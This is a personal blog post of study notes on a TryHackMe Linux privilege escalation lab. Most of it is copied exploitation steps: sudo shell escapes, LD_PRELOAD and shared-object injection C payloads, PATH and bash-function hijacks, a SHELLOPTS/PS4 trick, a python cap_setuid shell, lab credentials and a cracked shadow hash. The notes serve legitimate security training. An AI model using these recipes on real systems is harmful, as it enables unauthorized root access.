---
layout: post
title:  "TCM: Linux Priviledge Escalation"
date:   2024-02-04 13:50:01 -0600
categories: TCM
image: /assets/img/linux-privescalation.png
---
[Linux PrivEsc Lab](https://tryhackme.com/room/linuxprivescarena)
Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123
# Sudo & SUID

Following the course, it starts to get more difficult, when going through the Sudo in 
## Task 8 Sudo (Abusing Intended Functionality)

Shell escaping was fairly straight forward except he didnt explain the multiple lines.
When you have something from gtfobins
```
TERM= sudo more /etc/profile
!/bin/sh
```
it means type the lines 1 at a time, so the second line would be typed after your run the 1st one

## Task 9 Sudo (LD_PRELOAD)
I didn't like this as you had to understand john the ripper, but luckily I was halfway thru the [John the Ripper](
https://tryhackme.com/room/johntheripper0) room so that help get the syntax correct, and look at that wordlist.  Where is that?

```
Your hash.txt file should look like this:
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::


john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=sha512crypt
```
I added the password in the rockyou.txt file so I can make this run, but the format was missing

## Task 10
Here's where the REAL learning begins.  He is using the LD_PRELOAD to preload a c file 

Linux VM

1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id

I really enjoyed this one and had to practice several times before understanding what I'm doing.

## Task 11 SUID (Shared Object Injection)
I would actually STOP here and make sure you understand what he's doing in Task 10.  

Its very similar except he's running suid-so

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Linux VM

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id

## Task 12 SUID (Symlinks)

This uses symlink which I'm not too experienced with, but he's using that link to execute in the logs

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is password123
3. Once escalated to root, in command prompt type: su -l www-data
4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: su root
2. The root password is password123
3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: id

Probably have to re-watch this video

## Task 13 SUID (Environment Variables #1)

### Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

### Exploitation

Linux VM

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id

## Task 14 SUID (Environment Variables #2)

### Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env2
4. From the output, notice the functions used by the binary.

### Exploitation Method #1

Linux VM

1. In command prompt type:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
2. In command prompt type:
export -f /usr/sbin/service
3. In command prompt type: /usr/local/bin/suid-env2

### Exploitation Method #2

Linux VM

1. In command prompt type:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```
## Task 15 Capabilities

### Detection

Linux VM

1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

### Linux VM

1. In command prompt type:
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```